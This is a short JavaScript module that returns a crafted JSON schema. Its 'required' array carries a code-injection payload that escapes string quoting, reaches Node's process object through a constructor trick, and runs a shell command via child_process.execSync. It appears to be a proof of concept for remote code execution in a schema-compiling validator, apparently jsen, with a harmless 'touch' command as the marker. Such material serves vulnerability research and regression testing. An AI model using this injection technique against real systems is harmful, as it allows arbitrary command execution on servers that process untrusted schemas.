function getPayload() {
    return {
        schema: JSON.parse(
            JSON.stringify({
                type: "object",
                properties: { username: { type: "string" } },
                required: [
                    "\"+clearImmediate.constructor(`return process;`)().mainModule.require(`child_process`).execSync('touch jsen')+\""
                ],
            })
        )
    };
}

module.exports = { getPayload };